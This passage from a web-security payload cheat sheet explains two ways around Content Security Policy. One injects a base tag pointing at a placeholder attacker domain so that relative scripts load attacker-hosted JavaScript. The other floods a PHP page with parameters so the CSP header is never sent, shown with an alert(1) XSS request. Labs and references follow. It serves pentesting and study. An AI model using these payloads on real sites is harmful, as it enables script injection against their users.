<!-- source: XSS Injection/4 - CSP Bypass.md | chunk 2/2 | MIT — Copyright (c) 2019 Swissky (PayloadsAllTheThings) -->

- CSP like `script-src 'nonce-RANDOM_NONCE'`
- Imported JS file with a relative link: `<script src='/PATH.js'></script>`

**Payload**:

- Inject a base tag.

  ```html
  <base href=http://[ATTACKER.DOMAIN.TLD]>
  ```

- Host your custom js file at the same path that one of the website's script.

  ```ps1
  http://[ATTACKER.DOMAIN.TLD]/PATH.js
  ```

## Bypass CSP header sent by PHP

**Requirements**:

- CSP sent by PHP `header()` function

**Payload**:

In default `php:apache` image configuration, PHP cannot modify headers when the response's data has already been written. This event occurs when a warning is raised by PHP engine.

Here are several ways to generate a warning:

- 1000 $_GET parameters
- 1000 $_POST parameters
- 20 $_FILES

If the **Warning** are configured to be displayed you should get these:

- **Warning**: `PHP Request Startup: Input variables exceeded 1000. To increase the limit change max_input_vars in php.ini. in Unknown on line 0`
- **Warning**: `Cannot modify header information - headers already sent in /var/www/html/index.php on line 2`

```ps1
GET /?xss=<script>alert(1)</script>&a&a&a&a&a&a&a&a...[REPEATED &a 1000 times]&a&a&a&a
```

Source: [@pilvar222](https://twitter.com/pilvar222/status/1784618120902005070)

## Labs

- [Root Me - CSP Bypass - Inline Code](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Inline-code)
- [Root Me - CSP Bypass - Nonce](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce)
- [Root Me - CSP Bypass - Nonce 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Nonce-2)
- [Root Me - CSP Bypass - Dangling Markup](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup)
- [Root Me - CSP Bypass - Dangling Markup 2](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-Dangling-markup-2)
- [Root Me - CSP Bypass - JSONP](https://www.root-me.org/en/Challenges/Web-Client/CSP-Bypass-JSONP)

## References

- [Airbnb – When Bypassing JSON Encoding, XSS Filter, WAF, CSP, and Auditor turns into Eight Vulnerabilities - Brett Buerhaus (@bbuerhaus) - March 8, 2017](https://web.archive.org/web/20170330144550/https://buer.haus/2017/03/08/airbnb-when-bypassing-json-encoding-xss-filter-waf-csp-and-auditor-turns-into-eight-vulnerabilities/)
- [D1T1 - So We Broke All CSPs - Michele Spagnuolo and Lukas Weichselbaum - June 27, 2017](http://web.archive.org/web/20170627043828/https://conference.hitb.org/hitbsecconf2017ams/materials/D1T1%20-%20Michele%20Spagnuolo%20and%20Lukas%20Wilschelbaum%20-%20So%20We%20Broke%20All%20CSPS.pdf)
- [How to use Google’s CSP Evaluator to bypass CSP - Thomas Orlita - September 9, 2018](https://web.archive.org/web/20260220005424/https://websecblog.com/vulns/google-csp-evaluator/)
- [Making an XSS triggered by CSP bypass on Twitter - wiki.ioin.in(查看原文) - April 6, 2020](https://web.archive.org/web/20260226005506/https://www.buaq.net/go-25883.html)
